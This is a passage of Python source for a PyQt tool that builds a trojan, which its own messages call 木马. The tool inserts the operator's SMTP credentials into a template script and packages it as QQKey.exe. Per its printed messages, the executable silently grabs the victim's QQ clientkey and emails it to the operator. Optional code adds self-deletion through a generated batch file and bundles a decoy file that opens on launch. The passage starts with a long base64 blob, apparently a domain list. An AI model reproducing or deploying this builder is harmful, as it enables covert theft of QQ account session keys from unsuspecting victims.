RVBTT04KRVFVSVBNRU5UCkVSCkVSSUNTU09OCkVSTkkKRVMKRVNRCkVTVEFURQpFVApFVQpFVVJPVklTSU9OCkVVUwpFVkVOVFMKRVhDSEFOR0UKRVhQRVJUCkVYUE9TRUQKRVhQUkVTUwpFWFRSQVNQQUNFCkZBR0UKRkFJTApGQUlSV0lORFMKRkFJVEgKRkFNSUxZCkZBTgpGQU5TCkZBUk0KRkFSTUVSUwpGQVNISU9OCkZBU1QKRkVERVgKRkVFREJBQ0sKRkVSUkFSSQpGRVJSRVJPCkZJCkZJREVMSVRZCkZJRE8KRklMTQpGSU5BTApGSU5BTkNFCkZJTkFOQ0lBTApGSVJFCkZJUkVTVE9ORQpGSVJNREFMRQpGSVNICkZJU0hJTkcKRklUCkZJVE5FU1MKRkoKRksKRkxJQ0tSCkZMSUdIVFMKRkxJUgpGTE9SSVNUCkZMT1dFUlMKRkxZCkZNCkZPCkZPTwpGT09ECkZPT1RCQUxMCkZPUkQKRk9SRVgKRk9SU0FMRQpGT1JVTQpGT1VOREFUSU9OCkZPWApGUgpGUkVFCkZSRVNFTklVUwpGUkwKRlJPR0FOUwpGUk9OVElFUgpGVFIKRlVKSVRTVQpGVU4KRlVORApGVVJOSVRVUkUKRlVUQk9MCkZZSQpHQQpHQUwKR0FMTEVSWQpHQUxMTwpHQUxMVVAKR0FNRQpHQU1FUwpHQVAKR0FSREVOCkdBWQpHQgpHQklaCkdECkdETgpHRQpHRUEKR0VOVApHRU5USU5HCkdFT1JHRQpHRgpHRwpHR0VFCkdICkdJCkdJRlQKR0lGVFMKR0lWRVMKR0lWSU5HCkdMCkdMQVNTCkdMRQpHTE9CQUwKR0xPQk8KR00KR01BSUwKR01CSApHTU8KR01YCkdOCkdPREFERFkKR09MRApHT0xEUE9JTlQKR09MRgpHT08KR09PRFlFQVIKR09PRwpHT09HTEUKR09QCkdPVApHT1YKR1AKR1EKR1IKR1JBSU5HRVIKR1JBUEhJQ1MKR1JBVElTCkdSRUVOCkdSSVBFCkdST0NFUlkKR1JPVVAKR1MKR1QKR1UKR1VDQ0kKR1VHRQpHVUlERQpHVUlUQVJTCkdVUlUKR1cKR1kKSEFJUgpIQU1CVVJHCkhBTkdPVVQKSEFVUwpIQk8KSERGQwpIREZDQkFOSwpIRUFMVEgKSEVBTFRIQ0FSRQpIRUxQCkhFTFNJTktJCkhFUkUKSEVSTUVTCkhJUEhPUApISVNBTUlUU1UKSElUQUNISQpISVYKSEsKSEtUCkhNCkhOCkhPQ0tFWQpIT0xESU5HUwpIT0xJREFZCkhPTUVERVBPVApIT01FR09PRFMKSE9NRVMKSE9NRVNFTlNFCkhPTkRBCkhPUlNFCkhPU1BJVEFMCkhPU1QKSE9TVElORwpIT1QKSE9URUxTCkhPVE1BSUwKSE9VU0UKSE9XCkhSCkhTQkMKSFQKSFUKSFVHSEVTCkhZQVRUCkhZVU5EQUkKSUJNCklDQkMKSUNFCklDVQpJRApJRQpJRUVFCklGTQpJS0FOTwpJTApJTQpJTUFNQVQKSU1EQgpJTU1PCklNTU9CSUxJRU4KSU4KSU5DCklORFVTVFJJRVMKSU5GSU5JVEkKSU5GTwpJTkcKSU5LCklOU1RJVFVURQpJTlNVUkFOQ0UKSU5TVVJFCklOVApJTlRFUk5BVElPTkFMCklOVFVJVApJTlZFU1RNRU5UUwpJTwpJUElSQU5HQQpJUQpJUgpJUklTSApJUwpJU01BSUxJCklTVApJU1RBTkJVTApJVApJVEFVCklUVgpKQUdVQVIKSkFWQQpKQ0IKSkUKSkVFUApKRVRaVApKRVdFTFJZCkpJTwpKTEwKSk0KSk1QCkpOSgpKTwpKT0JTCkpPQlVSRwpKT1QKSk9ZCkpQCkpQTU9SR0FOCkpQUlMKSlVFR09TCkpVTklQRVIKS0FVRkVOCktEREkKS0UKS0VSUllIT1RFTFMKS0VSUllMT0dJU1RJQ1MKS0VSUllQUk9QRVJUSUVTCktGSApLRwpLSApLSQpLSUEKS0lEUwpLSU0KS0lORExFCktJVENIRU4KS0lXSQpLTQpLTgpLT0VMTgpLT01BVFNVCktPU0hFUgpLUApLUE1HCktQTgpLUgpLUkQKS1JFRApLVU9LR1JPVVAKS1cKS1kKS1lPVE8KS1oKTEEKTEFDQUlYQQpMQU1CT1JHSElOSQpMQU1FUgpMQU5DQVNURVIKTEFORApMQU5EUk9WRVIKTEFOWEVTUwpMQVNBTExFCkxBVApMQVRJTk8KTEFUUk9CRQpMQVcKTEFXWUVSCkxCCkxDCkxEUwpMRUFTRQpMRUNMRVJDCkxFRlJBSwpMRUdBTApMRUdPCkxFWFVTCkxHQlQKTEkKTElETApMSUZFCkxJRkVJTlNVUkFOQ0UKTElGRVNUWUxFCkxJR0hUSU5HCkxJS0UKTElMTFkKTElNSVRFRApMSU1PCkxJTkNPTE4KTElOSwpMSVBTWQpMSVZFCkxJVklORwpMSwpMTEMKTExQCkxPQU4KTE9BTlMKTE9DS0VSCkxPQ1VTCkxPTApMT05ET04KTE9UVEUKTE9UVE8KTE9WRQpMUEwKTFBMRklOQU5DSUFMCkxSCkxTCkxUCkxURApMVERBCkxVCkxVTkRCRUNLCkxVWEUKTFVYVVJZCkxWCkxZCk1BCk1BRFJJRApNQUlGCk1BSVNPTgpNQUtFVVAKTUFOCk1BTkFHRU1FTlQKTUFOR08KTUFQCk1BUktFVApNQVJLRVRJTkcKTUFSS0VUUwpNQVJSSU9UVApNQVJTSEFMTFMKTUFUVEVMCk1CQQpNQwpNQ0tJTlNFWQpNRApNRQpNRUQKTUVESUEKTUVFVApNRUxCT1VSTkUKTUVNRQpNRU1PUklBTApNRU4KTUVOVQpNRVJDS01TRApNRwpNSApNSUFNSQpNSUNST1NPRlQKTUlMCk1JTkkKTUlOVApNSVQKTUlUU1VCSVNISQpNSwpNTApNTEIKTUxTCk1NCk1NQQpNTgpNTwpNT0JJCk1PQklMRQpNT0RBCk1PRQpNT0kKTU9NCk1PTkFTSApNT05FWQpNT05TVEVSCk1PUk1PTgpNT1JUR0FHRQpNT1NDT1cKTU9UTwpNT1RPUkNZQ0xFUwpNT1YKTU9WSUUKTVAKTVEKTVIKTVMKTVNECk1UCk1UTgpNVFIKTVUKTVVTRVVNCk1VU0lDCk1WCk1XCk1YCk1ZCk1aCk5BCk5BQgpOQUdPWUEKTkFNRQpOQVRVUkEKTkFWWQpOQkEKTkMKTkUKTkVDCk5FVApORVRCQU5LCk5FVEZMSVgKTkVUV09SSwpORVVTVEFSCk5FVwpORVdTCk5FWFQKTkVYVERJUkVDVApORVhVUwpORgpORkwKTkcKTkdPCk5ISwpOSQpOSUNPCk5JS0UKTklLT04KTklOSkEKTklTU0FOCk5JU1NBWQpOTApOTwpOT0tJQQpOT1JUT04KTk9XCk5PV1JVWgpOT1dUVgpOUApOUgpOUkEKTlJXCk5UVApOVQpOWUMKTloKT0JJCk9CU0VSVkVSCk9GRklDRQpPS0lOQVdBCk9MQVlBTgpPTEFZQU5HUk9VUApPTExPCk9NCk9NRUdBCk9ORQpPTkcKT05MCk9OTElORQpPT08KT1BFTgpPUkFDTEUKT1JBTkdFCk9SRwpPUkdBTklDCk9SSUdJTlMKT1NBS0EKT1RTVUtBCk9UVApPVkgKUEEKUEFHRQpQQU5BU09OSUMKUEFSSVMKUEFSUwpQQVJUTkVSUwpQQVJUUwpQQVJUWQpQQVkKUENDVwpQRQpQRVQKUEYKUEZJWkVSClBHClBIClBIQVJNQUNZClBIRApQSElMSVBTClBIT05FClBIT1RPClBIT1RPR1JBUEhZClBIT1RPUwpQSFlTSU8KUElDUwpQSUNURVQKUElDVFVSRVMKUElEClBJTgpQSU5HClBJTksKUElPTkVFUgpQSVpaQQpQSwpQTApQTEFDRQpQTEFZClBMQVlTVEFUSU9OClBMVU1CSU5HClBMVVMKUE0KUE4KUE5DClBPSEwKUE9LRVIKUE9MSVRJRQpQT1JOClBPU1QKUFIKUFJBTUVSSUNBClBSQVhJClBSRVNTClBSSU1FClBSTwpQUk9EClBST0RVQ1RJT05TClBST0YKUFJPR1JFU1NJVkUKUFJPTU8KUFJPUEVSVElFUwpQUk9QRVJUWQpQUk9URUNUSU9OClBSVQpQUlVERU5USUFMClBTClBUClBVQgpQVwpQV0MKUFkKUUEKUVBPTgpRVUVCRUMKUVVFU1QKUkFDSU5HClJBRElPClJFClJFQUQKUkVBTEVTVEFURQpSRUFMVE9SClJFQUxUWQpSRUNJUEVTClJFRApSRURTVE9ORQpSRURVTUJSRUxMQQpSRUhBQgpSRUlTRQpSRUlTRU4KUkVJVApSRUxJQU5DRQpSRU4KUkVOVApSRU5UQUxTClJFUEFJUgpSRVBPUlQKUkVQVUJMSUNBTgpSRVNUClJFU1RBVVJBTlQKUkVWSUVXClJFVklFV1MKUkVYUk9USApSSUNIClJJQ0hBUkRMSQpSSUNPSApSSUwKUklPClJJUApSTwpST0NLUwpST0RFTwpST0dFUlMKUk9PTQpSUwpSU1ZQClJVClJVR0JZClJVSFIKUlVOClJXClJXRQpSWVVLWVUKU0EKU0FBUkxBTkQKU0FGRQpTQUZFVFkKU0FLVVJBClNBTEUKU0FMT04KU0FNU0NMVUIKU0FNU1VORwpTQU5EVklLClNBTkRWSUtDT1JPTUFOVApTQU5PRkkKU0FQClNBUkwKU0FTClNBVkUKU0FYTwpTQgpTQkkKU0JTClNDClNDQgpTQ0hBRUZGTEVSClNDSE1JRFQKU0NIT0xBUlNISVBTClNDSE9PTApTQ0hVTEUKU0NIV0FSWgpTQ0lFTkNFClNDT1QKU0QKU0UKU0VBUkNIClNFQVQKU0VDVVJFClNFQ1VSSVRZClNFRUsKU0VMRUNUClNFTkVSClNFUlZJQ0VTClNFVkVOClNFVwpTRVgKU0VYWQpTRlIKU0cKU0gKU0hBTkdSSUxBClNIQVJQClNIQVcKU0hFTEwKU0hJQQpTSElLU0hBClNIT0VTClNIT1AKU0hPUFBJTkcKU0hPVUpJClNIT1cKU0kKU0lMSwpTSU5BClNJTkdMRVMKU0lURQpTSgpTSwpTS0kKU0tJTgpTS1kKU0tZUEUKU0wKU0xJTkcKU00KU01BUlQKU01JTEUKU04KU05DRgpTTwpTT0NDRVIKU09DSUFMClNPRlRCQU5LClNPRlRXQVJFClNPSFUKU09MQVIKU09MVVRJT05TClNPTkcKU09OWQpTT1kKU1BBClNQQUNFClNQT1JUClNQT1QKU1IKU1JMClNTClNUClNUQURBClNUQVBMRVMKU1RBUgpTVEFURUJBTksKU1RBVEVGQVJNClNUQwpTVENHUk9VUApTVE9DS0hPTE0KU1RPUkFHRQpTVE9SRQpTVFJFQU0KU1RVRElPClNUVURZClNUWUxFClNVClNVQ0tTClNVUFBMSUVTClNVUFBMWQpTVVBQT1JUClNVUkYKU1VSR0VSWQpTVVpVS0kKU1YKU1dBVENIClNXSVNTClNYClNZClNZRE5FWQpTWVNURU1TClNaClRBQgpUQUlQRUkKVEFMSwpUQU9CQU8KVEFSR0VUClRBVEFNT1RPUlMKVEFUQVIKVEFUVE9PClRBWApUQVhJClRDClRDSQpURApUREsKVEVBTQpURUNIClRFQ0hOT0xPR1kKVEVMClRFTUFTRUsKVEVOTklTClRFVkEKVEYKVEcKVEgKVEhEClRIRUFURVIKVEhFQVRSRQpUSUFBClRJQ0tFVFMKVElFTkRBClRJUFMKVElSRVMKVElST0wKVEoKVEpNQVhYClRKWApUSwpUS01BWFgKVEwKVE0KVE1BTEwKVE4KVE8KVE9EQVkKVE9LWU8KVE9PTFMKVE9QClRPUkFZClRPU0hJQkEKVE9UQUwKVE9VUlMKVE9XTgpUT1lPVEEKVE9ZUwpUUgpUUkFERQpUUkFESU5HClRSQUlOSU5HClRSQVZFTApUUkFWRUxFUlMKVFJBVkVMRVJTSU5TVVJBTkNFClRSVVNUClRSVgpUVApUVUJFClRVSQpUVU5FUwpUVVNIVQpUVgpUVlMKVFcKVFoKVUEKVUJBTksKVUJTClVHClVLClVOSUNPTQpVTklWRVJTSVRZClVOTwpVT0wKVVBTClVTClVZClVaClZBClZBQ0FUSU9OUwpWQU5BClZBTkdVQVJEClZDClZFClZFR0FTClZFTlRVUkVTClZFUklTSUdOClZFUlNJQ0hFUlVORwpWRVQKVkcKVkkKVklBSkVTClZJREVPClZJRwpWSUtJTkcKVklMTEFTClZJTgpWSVAKVklSR0lOClZJU0EKVklTSU9OClZJVkEKVklWTwpWTEFBTkRFUkVOClZOClZPREtBClZPTFZPClZPVEUKVk9USU5HClZPVE8KVk9ZQUdFClZVCldBTEVTCldBTE1BUlQKV0FMVEVSCldBTkcKV0FOR0dPVQpXQVRDSApXQVRDSEVTCldFQVRIRVIKV0VBVEhFUkNIQU5ORUwKV0VCQ0FNCldFQkVSCldFQlNJVEUKV0VECldFRERJTkcKV0VJQk8KV0VJUgpXRgpXSE9TV0hPCldJRU4KV0lLSQpXSUxMSUFNSElMTApXSU4KV0lORE9XUwpXSU5FCldJTk5FUlMKV01FCldPTFRFUlNLTFVXRVIKV09PRFNJREUKV09SSwpXT1JLUwpXT1JMRApXT1cKV1MKV1RDCldURgpYQk9YClhFUk9YClhJSFVBTgpYSU4KWE4tLTExQjRDM0QKWE4tLTFDSzJFMUIKWE4tLTFRUVcyM0EKWE4tLTJTQ1JKOUMKWE4tLTMwUlI3WQpYTi0tM0JTVDAwTQpYTi0tM0RTNDQzRwpYTi0tM0UwQjcwN0UKWE4tLTNIQ1JKOUMKWE4tLTNQWFU4SwpYTi0tNDJDMkQ5QQpYTi0tNDVCUjVDWUwKWE4tLTQ1QlJKOUMKWE4tLTQ1UTExQwpYTi0tNERCUkswQ0UKWE4tLTRHQlJJTQpYTi0tNTRCN0ZUQTBDQwpYTi0tNTVRVzQyRwpYTi0tNTVRWDVEClhOLS01U1UzNEo5MzZCR1NHClhOLS01VFpNNUcKWE4tLTZGUlo4MkcKWE4tLTZRUTk4NkIzWEwKWE4tLTgwQURYSEtTClhOLS04MEFPMjFBClhOLS04MEFRRUNEUjFBClhOLS04MEFTRUhEQgpYTi0tODBBU1dHClhOLS04WTBBMDYzQQpYTi0tOTBBM0FDClhOLS05MEFFClhOLS05MEFJUwpYTi0tOURCUTJBClhOLS05RVQ1MlUKWE4tLTlLUlQwMEEKWE4tLUI0VzYwNUZFUkQKWE4tLUJDSzFCOUE1RFJFNEMKWE4tLUMxQVZHClhOLS1DMkJSN0cKWE4tLUNDSzJCM0IKWE4tLUNDS1dDWEVURApYTi0tQ0c0QktJClhOLS1DTENIQzBFQTBCMkcyQTlHQ0QKWE4tLUNaUjY5NEIKWE4tLUNaUlMwVApYTi0tQ1pSVTJEClhOLS1EMUFDSjNCClhOLS1EMUFMRgpYTi0tRTFBNEMKWE4tLUVDS1ZEVEM5RApYTi0tRUZWWTg4SApYTi0tRkNUNDI5SwpYTi0tRkhCRUkKWE4tLUZJUTIyOEM1SFMKWE4tLUZJUTY0QgpYTi0tRklRUzhTClhOLS1GSVFaOVMKWE4tLUZKUTcyMEEKWE4tLUZMVzM1MUUKWE4tLUZQQ1JKOUMzRApYTi0tRlpDMkM5RTJDClhOLS1GWllTOEQ2OVVWR00KWE4tLUcyWFg0OEMKWE4tLUdDS1IzRjBGClhOLS1HRUNSSjlDClhOLS1HSzNBVDFFClhOLS1IMkJSRUczRVZFClhOLS1IMkJSSjlDClhOLS1IMkJSSjlDOEMKWE4tLUhYVDgxNEUKWE4tLUkxQjZCMUE2QTJFClhOLS1JTVI1MTNOClhOLS1JTzBBN0kKWE4tLUoxQUVGClhOLS1KMUFNSApYTi0tSjZXMTkzRwpYTi0tSkxRNDgwTjJSRwpYTi0tSlZSMTg5TQpYTi0tS0NSWDc3RDFYNEEKWE4tLUtQUlcxM0QKWE4tLUtQUlk1N0QKWE4tLUtQVVQzSQpYTi0tTDFBQ0MKWE4tLUxHQkJBVDFBRDhKClhOLS1NR0I5QVdCRgpYTi0tTUdCQTNBM0VKVApYTi0tTUdCQTNBNEYxNkEKWE4tLU1HQkE3QzBCQk4wQQpYTi0tTUdCQUFNN0E4SApYTi0tTUdCQUIyQkQKWE4tLU1HQkFIMUEzSEpLUkQKWE4tLU1HQkFJOUFaR1FQNkoKWE4tLU1HQkFZSDdHUEEKWE4tLU1HQkJIMUEKWE4tLU1HQkJIMUE3MUUKWE4tLU1HQkMwQTlBWkNHClhOLS1NR0JDQTdEWkRPClhOLS1NR0JDUFE2R1BBMUEKWE4tLU1HQkVSUDRBNUQ0QVIKWE4tLU1HQkdVODJBClhOLS1NR0JJNEVDRVhQClhOLS1NR0JQTDJGSApYTi0tTUdCVDNESEQKWE4tLU1HQlRYMkIKWE4tLU1HQlg0Q0QwQUIKWE4tLU1JWDg5MUYKWE4tLU1LMUJVNDRDClhOLS1NWFRRMU0KWE4tLU5HQkM1QVpEClhOLS1OR0JFOUUwQQpYTi0tTkdCUlgKWE4tLU5PREUKWE4tLU5RVjdGClhOLS1OUVY3RlMwMEVNQQpYTi0tTllRWTI2QQpYTi0tTzNDVzRIClhOLS1PR0JQRjhGTApYTi0tT1RVNzk2RApYTi0tUDFBQ0YKWE4tLVAxQUkKWE4tLVBHQlMwREgKWE4tLVBTU1kyVQpYTi0tUTdDRTZBClhOLS1ROUpZQjRDClhOLS1RQ0tBMVBNQwpYTi0tUVhBNkEKWE4tLVFYQU0KWE4tLVJIUVY5NkcKWE4tLVJPVlU4OEIKWE4tLVJWQzFFMEFNM0UKWE4tLVM5QlJKOUMKWE4tLVNFUzU1NEcKWE4tLVQ2MEI1NkEKWE4tLVRDS1dFClhOLS1USVE0OVhRWUoKWE4tLVVOVVA0WQpYTi0tVkVSTUdFTlNCRVJBVEVSLUNUQgpYTi0tVkVSTUdFTlNCRVJBVFVORy1QV0IKWE4tLVZIUVVWClhOLS1WVVE4NjFCClhOLS1XNFI4NUVMOEZIVTVETlJBClhOLS1XNFJTNDBMClhOLS1XR0JIMUMKWE4tLVdHQkw2QQpYTi0tWEhRNTIxQgpYTi0tWEtDMkFMM0hZRTJBClhOLS1YS0MyREwzQTVFRTBIClhOLS1ZOUEzQVEKWE4tLVlGUk80STY3TwpYTi0tWUdCSTJBTU1YClhOLS1aRlIxNjRCClhYWApYWVoKWUFDSFRTCllBSE9PCllBTUFYVU4KWUFOREVYCllFCllPRE9CQVNISQpZT0dBCllPS09IQU1BCllPVQpZT1VUVUJFCllUCllVTgpaQQpaQVBQT1MKWkFSQQpaRVJPClpJUApaTQpaT05FClpVRVJJQ0gKWlcK".encode(
                        'utf-8')))
            if reset_icon_path or os.path.isfile(self.icon_path):
                print("检测到图标文件不存在,将使用默认图标!")
                self.icon_path = ''
            print("环境已准备完毕!")
            smtp_server = f'"{self.lineEdit.text()}"'
            smtp_port = self.lineEdit_2.text()
            smtp_account = f'"{self.lineEdit_3.text()}"'
            smtp_password = f'"{self.lineEdit_4.text()}"'
            if smtp_account == '""' or smtp_password == '""':
                print("请输入账号信息!")
                self.func_running = False
                return
            if smtp_server == '""':
                print("检测到smtp服务器为空,开始智能选择...")
                smtp_server = self.find_smtp_server(smtp_account)
                if not smtp_server:
                    print("选择失败,可能是未支持的邮箱,请手动输入smtp服务器!")
                    self.func_running = False
                    return
                print("选择成功!当前smtp服务器为:"+smtp_server[1:-1])
                self.lineEdit.setText(smtp_server[1:-1])
            zip_path = '.\\Tools.zip'
            # 文件存储路径
            if not os.path.isdir('data'):
                os.mkdir('data')
            save_path = '.\\data\\'
            # 读取压缩文件
            file = zipfile.ZipFile(zip_path)
            # 解压文件
            print('开始解压文件...')
            file.extractall(save_path)
            # 关闭文件流
            file.close()
            with open(".\\data\\qkey_code.py", 'r', encoding='utf-8') as f:
                content = f.read()
            content = content.replace("smtp_account", smtp_account)
            content = content.replace("smtp_password", smtp_password)
            content = content.replace("smtp_server", smtp_server)
            content = content.replace("smtp_port", smtp_port)
            _ = [False,False] # 标记是否需要自毁与是否捆绑文件,以便后面用户改变checkbox导致输出错误
            __ = '\\'
            if self.checkBox.isChecked():
                _[0] = True
                content += r"""
import sys,os
if os.path.basename(sys.executable) != 'python.exe':
    os.chdir(os.path.dirname(sys.executable))
path = sys.argv[0]
print(path)
with open("1.bat", 'w', encoding='gbk') as f:
    f.write(f"@echo off\nping -n 1 127.0.0.1>nul\ndel {path}\ndel %0")
os.startfile("1.bat")
sys.exit(0)"""
            if self.file_path:
                self.file_path = self.file_path.replace('/',__)
                content = f"""import sys,os
# 根据系统运行位置确认basedir路径
if getattr(sys, 'frozen', None):
    basedir = sys._MEIPASS
else:
    basedir = os.path.dirname(__file__)
file = os.path.join(basedir, '{os.path.basename(self.file_path)}')
os.startfile(file)\n""" + content
            # 懒得更搭建包了,直接在工具里硬修改得了:)
            content = content.replace("if clientkey is None:","if not clientkey:")
            content = content.replace("--------登录网址--------","--------登录网址--------\nTips:如果出现qzone和mail均无法登录而qun可以登录的情况请尝试使用主界面的Key解析器进行解析登录\n")
            content = content.replace("uin:{uin}","uin:{uin}\nclientkey:{clientkey}")
            with open(".\\qkey_code.py", 'w', encoding='utf-8') as f:
                f.write(content)
            print("开始下载打包所需文件...")
            subprocess.call(".\\data\\python.exe -m pip install pyinstaller requests urlextract psutil -i https://pypi.tuna.tsinghua.edu.cn/simple",creationflags=subprocess.CREATE_NO_WINDOW)
            print("开始打包...")
            subprocess.call(f".\\data\\Scripts\\pyinstaller.exe -F -w{' -i '+self.icon_path.replace('/',__) if self.icon_path != '' else ''} --add-data .\\tlds-alpha-by-domain.txt;.\\urlextract\data qkey_code.py{f' --add-data {self.file_path};.' if self.file_path else ''}",creationflags=subprocess.CREATE_NO_WINDOW)
            if os.path.isfile("QQKey.exe"):
                os.remove('QQKey.exe')
            os.rename(".\\dist\\qkey_code.exe", ".\\QQKey.exe")
            print("打包完毕!")
            print("文件名为:QQKey.exe")
            print("目标如果打开此文件将会获取QQkey并发送至你的邮箱")
            if _[1] == True: print(f"木马已捆绑文件{os.path.basename(self.file_path)},目标打开木马后将自动打开捆绑文件!")
            if _[0] == True: print("注意:运行完后程序自动删除!")
            print("注意:当对方打开时程序将静默获取,并不会出现弹出窗口",end='')
            sys.stdout = sys.__stdout__
            self.func_running = False
            return
        except Exception as e:
            print("打包失败,发生致命错误!")
            print("原因:\n"+traceback.format_exc())
        self.func_running = False
        sys.stdout = sys.__stdout__


if __name__ == '__main__':
    # 获取UIC窗口操作权限
    app = QtWidgets.QApplication(sys.argv)
    Dialog = QtWidgets.QDialog()
    # 调自定义的界面（即刚转换的.py对象）
    Ui = Ui_Dialog()
    Ui.setupUi(Dialog)
    # 显示窗口并释放资源
    Dialog.show()
    sys.exit(app.exec_())